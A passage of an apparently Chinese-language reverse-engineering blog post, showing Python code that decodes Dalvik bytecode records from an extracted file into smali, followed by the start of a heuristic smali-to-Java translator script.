class="subst">&#123;rn(BBBB)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;23x&quot;</span>:</span><br><span class="line">            size = <span class="number">2</span>;</span><br><span class="line">            A = a8;</span><br><span class="line">            B = units[pc + <span class="number">1</span>] &amp; <span class="number">0xFF</span>;</span><br><span class="line">            C = (units[pc + <span class="number">1</span>] &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;rn(B)&#125;</span>, <span class="subst">&#123;rn(C)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;22s&quot;</span>:</span><br><span class="line">            size = <span class="number">2</span>;</span><br><span class="line">            A = (a8 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">            B = a8 &amp; <span class="number">0xF</span>;</span><br><span class="line">            lit = s16(units[pc + <span class="number">1</span>])</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;rn(B)&#125;</span>, <span class="subst">&#123;lit&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;22b&quot;</span>:</span><br><span class="line">            size = <span class="number">2</span></span><br><span class="line">            A = a8</span><br><span class="line">            BC = units[pc + <span class="number">1</span>]</span><br><span class="line">            B = BC &amp; <span class="number">0xFF</span></span><br><span class="line">            C = s1_to_s8((BC &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>, <span class="number">8</span>)</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;rn(B)&#125;</span>, <span class="subst">&#123;C&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;32x&quot;</span>:</span><br><span class="line">            size = <span class="number">3</span>;</span><br><span class="line">            AAAA = units[pc + <span class="number">1</span>];</span><br><span class="line">            BBBB = units[pc + <span class="number">2</span>]</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(AAAA)&#125;</span>, <span class="subst">&#123;rn(BBBB)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;31t&quot;</span>:</span><br><span class="line">            size = <span class="number">3</span>;</span><br><span class="line">            A = a8;</span><br><span class="line">            off32 = s32_from_u2(units[pc + <span class="number">1</span>], units[pc + <span class="number">2</span>]);</span><br><span class="line">            tgt = pc + off32</span><br><span class="line">            payload_labels.setdefault(tgt, <span class="string">f&quot;:payload_<span class="subst">&#123;tgt:04x&#125;</span>&quot;</span>)</span><br><span class="line">            switch_bases[tgt] = pc</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> <span class="subst">&#123;rn(A)&#125;</span>, <span class="subst">&#123;payload_labels[tgt]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;35c&quot;</span>:</span><br><span class="line">            size = <span class="number">3</span>;</span><br><span class="line">            A = (a8 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">            G = a8 &amp; <span class="number">0xF</span>;</span><br><span class="line">            bbbb = units[pc + <span class="number">1</span>];</span><br><span class="line">            cdef = units[pc + <span class="number">2</span>]</span><br><span class="line">            C = (cdef) &amp; <span class="number">0xF</span>;</span><br><span class="line">            D = (cdef &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">            E = (cdef &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">            F = (cdef &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xF</span></span><br><span class="line">            regs = [C, D, E, F, G][:A]</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> &#123;&#123;<span class="subst">&#123;<span class="string">&#x27;, &#x27;</span>.join(rn(r) <span class="keyword">for</span> r <span class="keyword">in</span> regs)&#125;</span>&#125;&#125;, <span class="subst">&#123;fmt_ref(ref1, bbbb, <span class="literal">False</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;3rc&quot;</span>:</span><br><span class="line">            size = <span class="number">3</span>;</span><br><span class="line">            A = a8;</span><br><span class="line">            bbbb = units[pc + <span class="number">1</span>];</span><br><span class="line">            cccc = units[pc + <span class="number">2</span>]</span><br><span class="line">            regs = [rn(cccc + i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(A)]</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> &#123;&#123;<span class="subst">&#123;<span class="string">&#x27;, &#x27;</span>.join(regs)&#125;</span>&#125;&#125;, <span class="subst">&#123;fmt_ref(ref1, bbbb, <span class="literal">False</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;45cc&quot;</span>:</span><br><span class="line">            size = <span class="number">4</span>;</span><br><span class="line">            A = (a8 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">            G = a8 &amp; <span class="number">0xF</span>;</span><br><span class="line">            bbbb = units[pc + <span class="number">1</span>];</span><br><span class="line">            cdef = units[pc + <span class="number">2</span>];</span><br><span class="line">            hhhh = units[pc + <span class="number">3</span>]</span><br><span class="line">            C = (cdef) &amp; <span class="number">0xF</span>;</span><br><span class="line">            D = (cdef &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">            E = (cdef &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">            F = (cdef &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xF</span></span><br><span class="line">            regs = [C, D, E, F, G][:A]</span><br><span class="line">            out.append(</span><br><span class="line">                <span class="string">f&quot;<span class="subst">&#123;name&#125;</span> &#123;&#123;<span class="subst">&#123;<span class="string">&#x27;, &#x27;</span>.join(rn(r) <span class="keyword">for</span> r <span class="keyword">in</span> regs)&#125;</span>&#125;&#125;, <span class="subst">&#123;fmt_ref(ref1, bbbb, <span class="literal">False</span>)&#125;</span>, <span class="subst">&#123;fmt_ref(ref2, hhhh, <span class="literal">False</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> fmt == <span class="string">&quot;4rcc&quot;</span>:</span><br><span class="line">            size = <span class="number">4</span>;</span><br><span class="line">            A = a8;</span><br><span class="line">            bbbb = units[pc + <span class="number">1</span>];</span><br><span class="line">            cccc = units[pc + <span class="number">2</span>];</span><br><span class="line">            hhhh = units[pc + <span class="number">3</span>]</span><br><span class="line">            regs = [rn(cccc + i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(A)]</span><br><span class="line">            out.append(<span class="string">f&quot;<span class="subst">&#123;name&#125;</span> &#123;&#123;<span class="subst">&#123;<span class="string">&#x27;, &#x27;</span>.join(regs)&#125;</span>&#125;&#125;, <span class="subst">&#123;fmt_ref(ref1, bbbb, <span class="literal">False</span>)&#125;</span>, <span class="subst">&#123;fmt_ref(ref2, hhhh, <span class="literal">False</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            out.append(<span class="string">f&quot;# unhandled-format <span class="subst">&#123;fmt&#125;</span> (<span class="subst">&#123;name&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (size, out)</span><br><span class="line"></span><br><span class="line">    pc = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> pc &lt; insns_size:</span><br><span class="line">        sz, lines = decode_one(pc)</span><br><span class="line">        decoded.append((pc, <span class="built_in">max</span>(<span class="number">1</span>, sz), lines))</span><br><span class="line">        pc += <span class="built_in">max</span>(<span class="number">1</span>, sz)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> pco <span class="keyword">in</span> <span class="built_in">list</span>(payload_labels.keys()):</span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> &lt;= pco &lt; insns_size:</span><br><span class="line">            u0 = units[pco]</span><br><span class="line">            <span class="keyword">if</span> u0 == <span class="number">0x0100</span>:</span><br><span class="line">                payload_labels[pco] = <span class="string">f&quot;:pswitch_<span class="subst">&#123;pco:04x&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">elif</span> u0 == <span class="number">0x0200</span>:</span><br><span class="line">                payload_labels[pco] = <span class="string">f&quot;:sswitch_<span class="subst">&#123;pco:04x&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">elif</span> u0 == <span class="number">0x0300</span>:</span><br><span class="line">                payload_labels[pco] = <span class="string">f&quot;:array_<span class="subst">&#123;pco:04x&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                payload_labels[pco] = <span class="string">f&quot;:payload_<span class="subst">&#123;pco:04x&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    out: <span class="type">List</span>[<span class="built_in">str</span>] = []</span><br><span class="line">    out.append(<span class="string">f&quot;.registers <span class="subst">&#123;regs_size&#125;</span>&quot;</span>)</span><br><span class="line">    out.append(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    label_for_pc = &#123;pc: name <span class="keyword">for</span> pc, name <span class="keyword">in</span> labels_needed.items()&#125;</span><br><span class="line">    label_for_pc.update(&#123;pc: name <span class="keyword">for</span> pc, name <span class="keyword">in</span> payload_labels.items()&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">render_payload</span>(<span class="params">pc0: <span class="built_in">int</span>, content_lines: <span class="type">List</span>[<span class="built_in">str</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">        u0 = units[pc0]</span><br><span class="line">        lines: <span class="type">List</span>[<span class="built_in">str</span>] = []</span><br><span class="line">        <span class="keyword">if</span> u0 == <span class="number">0x0100</span>:</span><br><span class="line">            size = units[pc0 + <span class="number">1</span>] <span class="keyword">if</span> pc0 + <span class="number">1</span> &lt; insns_size <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            first_key = s32_from_u2(units[pc0 + <span class="number">2</span>], units[pc0 + <span class="number">3</span>]) <span class="keyword">if</span> pc0 + <span class="number">3</span> &lt; insns_size <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            base_pc = switch_bases.get(pc0, pc0)</span><br><span class="line">            lines.append(<span class="string">f&quot;.packed-switch <span class="subst">&#123;hex32(first_key)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">                idx = pc0 + <span class="number">4</span> + i * <span class="number">2</span></span><br><span class="line">                <span class="keyword">if</span> idx + <span class="number">1</span> &gt;= insns_size:</span><br><span class="line">                    lines.append(<span class="string">&quot;# truncated targets&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                tgt_rel = s32_from_u2(units[idx], units[idx + <span class="number">1</span>])</span><br><span class="line">                tgt_abs = base_pc + tgt_rel</span><br><span class="line">                lbl = label_for_pc.get(tgt_abs, <span class="string">f&quot;:L<span class="subst">&#123;tgt_abs:04x&#125;</span>&quot;</span>)</span><br><span class="line">                lines.append(<span class="string">f&quot;    <span class="subst">&#123;lbl&#125;</span>&quot;</span>)</span><br><span class="line">            lines.append(<span class="string">&quot;.end packed-switch&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> lines</span><br><span class="line">        <span class="keyword">if</span> u0 == <span class="number">0x0200</span>:</span><br><span class="line">            size = units[pc0 + <span class="number">1</span>] <span class="keyword">if</span> pc0 + <span class="number">1</span> &lt; insns_size <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            base_pc = switch_bases.get(pc0, pc0)</span><br><span class="line">            lines.append(<span class="string">&quot;.sparse-switch&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">                kp = pc0 + <span class="number">2</span> + i * <span class="number">4</span></span><br><span class="line">                <span class="keyword">if</span> kp + <span class="number">3</span> &gt;= insns_size:</span><br><span class="line">                    lines.append(<span class="string">&quot;# truncated pairs&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                key = s32_from_u2(units[kp], units[kp + <span class="number">1</span>])</span><br><span class="line">                tgt_rel = s32_from_u2(units[kp + <span class="number">2</span>], units[kp + <span class="number">3</span>])</span><br><span class="line">                tgt_abs = base_pc + tgt_rel</span><br><span class="line">                lbl = label_for_pc.get(tgt_abs, <span class="string">f&quot;:L<span class="subst">&#123;tgt_abs:04x&#125;</span>&quot;</span>)</span><br><span class="line">                lines.append(<span class="string">f&quot;    <span class="subst">&#123;hex32(key)&#125;</span> -&gt; <span class="subst">&#123;lbl&#125;</span>&quot;</span>)</span><br><span class="line">            lines.append(<span class="string">&quot;.end sparse-switch&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> lines</span><br><span class="line">        <span class="keyword">if</span> u0 == <span class="number">0x0300</span>:</span><br><span class="line">            elem_width = units[pc0 + <span class="number">1</span>] <span class="keyword">if</span> pc0 + <span class="number">1</span> &lt; insns_size <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line">            size = (units[pc0 + <span class="number">3</span>] &lt;&lt; <span class="number">16</span> | units[pc0 + <span class="number">2</span>]) <span class="keyword">if</span> pc0 + <span class="number">3</span> &lt; insns_size <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            lines.append(<span class="string">f&quot;.array-data <span class="subst">&#123;elem_width&#125;</span>&quot;</span>)</span><br><span class="line">            byte_off = pc0 * <span class="number">2</span> + <span class="number">8</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">                start = byte_off + i * elem_width</span><br><span class="line">                end = start + elem_width</span><br><span class="line">                <span class="keyword">if</span> end &gt; <span class="built_in">len</span>(insns_bytes): <span class="keyword">break</span></span><br><span class="line">                val = <span class="built_in">int</span>.from_bytes(insns_bytes[start:end], <span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">                lines.append(<span class="string">f&quot;    <span class="subst">&#123;<span class="built_in">hex</span>(val)&#125;</span>&quot;</span>)</span><br><span class="line">            lines.append(<span class="string">&quot;.end array-data&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> lines</span><br><span class="line">        <span class="keyword">return</span> content_lines</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> pc0, sz, content <span class="keyword">in</span> decoded:</span><br><span class="line">        <span class="keyword">if</span> pc0 <span class="keyword">in</span> label_for_pc:</span><br><span class="line">            out.append(label_for_pc[pc0])</span><br><span class="line">        u0 = units[pc0]</span><br><span class="line">        <span class="keyword">if</span> u0 <span class="keyword">in</span> (<span class="number">0x0100</span>, <span class="number">0x0200</span>, <span class="number">0x0300</span>):</span><br><span class="line">            out += render_payload(pc0, content)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            fixed = []</span><br><span class="line">            <span class="keyword">for</span> ln <span class="keyword">in</span> content:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;packed-switch&quot;</span> <span class="keyword">in</span> ln <span class="keyword">or</span> <span class="string">&quot;sparse-switch&quot;</span> <span class="keyword">in</span> ln <span class="keyword">or</span> <span class="string">&quot;fill-array-data&quot;</span> <span class="keyword">in</span> ln:</span><br><span class="line">                    <span class="keyword">for</span> tgt, lbl <span class="keyword">in</span> payload_labels.items():</span><br><span class="line">                        ln = ln.replace(<span class="string">f&quot;:payload_<span class="subst">&#123;tgt:04x&#125;</span>&quot;</span>, lbl)</span><br><span class="line">                fixed.append(ln)</span><br><span class="line">            out += fixed</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;\n&quot;</span>.join(out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">disasm_pack</span>(<span class="params">path: <span class="built_in">str</span>, regs_size: <span class="built_in">int</span>, ins_size: <span class="built_in">int</span>, dex: <span class="type">Optional</span>[DexFile]</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    pos = <span class="number">0</span></span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    out_all: <span class="type">List</span>[<span class="built_in">str</span>] = []</span><br><span class="line">    total = <span class="built_in">len</span>(data)</span><br><span class="line">    <span class="keyword">while</span> pos + <span class="number">8</span> &lt;= total:</span><br><span class="line">        off_u32, units = struct.unpack_from(<span class="string">&#x27;&lt;II&#x27;</span>, data, pos)</span><br><span class="line">        pos += <span class="number">8</span></span><br><span class="line">        need = units * <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> units == <span class="number">0</span> <span class="keyword">or</span> pos + need &gt; total:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        insns = data[pos:pos + need]</span><br><span class="line">        pos += need</span><br><span class="line">        smali = decode_block(insns, regs_size, ins_size, dex)</span><br><span class="line">        out_all.append(<span class="string">f&quot;# record <span class="subst">&#123;idx&#125;</span>: file_off=<span class="subst">&#123;<span class="built_in">hex</span>(off_u32)&#125;</span> units=<span class="subst">&#123;units&#125;</span> bytes=<span class="subst">&#123;need&#125;</span>\n<span class="subst">&#123;smali&#125;</span>\n&quot;</span>)</span><br><span class="line">        idx += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;# no records parsed (check file format)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;\n&quot;</span>.join(out_all)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python disassemble.py &lt;input_file&gt; &lt;dex_file&gt;&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    path = sys.argv[<span class="number">1</span>]</span><br><span class="line">    dex_path = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 寄存器数量和输入参数数量，根据实际情况调整</span></span><br><span class="line">    regs = <span class="number">64</span></span><br><span class="line">    ins = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    dex = DexFile(dex_path)</span><br><span class="line">    smali = disasm_pack(path, regs, ins, dex)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出到文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;out.smali&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(smali)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Disassembly completed. Output saved to out.smali&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python xxx.py extract.dat classes.dex</span><br></pre></td></tr></table></figure>

<p>得到out.smali  smali –&gt; java</p>
<p>exp2</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">smali2java.py</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Lightweight heuristic smali -&gt; java-like translator for small smali fragments</span></span><br><span class="line"><span class="string">(works on the &#x27;# record N: ...&#x27; style blocks like in the user&#x27;s sample).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Usage:</span></span><br><span class="line"><span class="string">    python3 smali2java.py input.smali.txt &gt; output.java</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Notes:</span></span><br><span class="line"><span class="string"> - This is NOT a full decompiler. It maps common smali instructions to readable Java-like lines.</span></span><br><span class="line"><span class="string"> - Useful for quickly reading what smali is doing; output needs manual cleanup.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Helpers ---------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_records</span>(<span class="params">lines: <span class="type">List</span>[<span class="built_in">str</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">dict</span>]:</span><br><span class="line">    records = []</span><br><span class="line">    cur = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        m = re.<span class="keyword">match</span>(<span class="string">r&quot;^# record\s+(\d+):\s*(.*)$&quot;</span>, line)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            <span class="keyword">if</span> cur:</span><br><span class="line">                records.append(cur)</span><br><span class="line">            cur = &#123;<span class="string">&quot;id&quot;</span>: <span class="built_in">int</span>(m.group(<span class="number">1</span>)), <span class="string">&quot;header&quot;</span>: m.group(<span class="number">2</span>), <span class="string">&quot;body&quot;</span>: []&#125;</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> cur <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># collect lines until next record</span></span><br><span class="line">        cur[<span class="string">&quot;body&quot;</span>].append(line.rstrip(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> cur:</span><br><span class="line">        records.append(cur)</span><br><span class="line">    <span class="keyword">return</span> records</span><br><span class="line"></span><br><span class="line"><span class="comment"># map registers v0..vN to readable names: var0, var1, this if v0? (heuristic)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vname</span>(<span class="params">v: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="comment"># v may be like &quot;v0&quot; or &quot;p0&quot;</span></span><br><span class="line">    <span class="keyword">return</span> v.replace(<span class="string">&quot;v&quot;</span>, <span class="string">&quot;var&quot;</span>).replace(<span class="string">&quot;p&quot;</span>, <span class="string">&quot;arg&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_array_data</span>(<span class="params">block_lines: <span class="type">List</span>[<span class="built_in">str</span>]</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="comment"># find .array-data and bytes then create Java array literal</span></span><br><span class="line">    arr = []</span><br><span class="line">    in_array = <span 